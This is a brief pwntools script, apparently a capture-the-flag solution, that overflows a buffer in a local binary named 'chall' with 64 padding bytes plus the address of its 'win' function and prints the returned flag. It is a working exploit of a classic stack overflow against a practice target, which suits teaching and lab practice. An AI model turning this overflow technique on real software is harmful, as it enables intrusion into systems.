#! /bin.python3
from pwn import *
elf = context.binary = ELF('./chall')
io = elf.process()
io.sendline(b'A'*64+pack(elf.symbols.win))
io.recvline()
print("FLAG: " + io.recvline().decode('utf-8'))
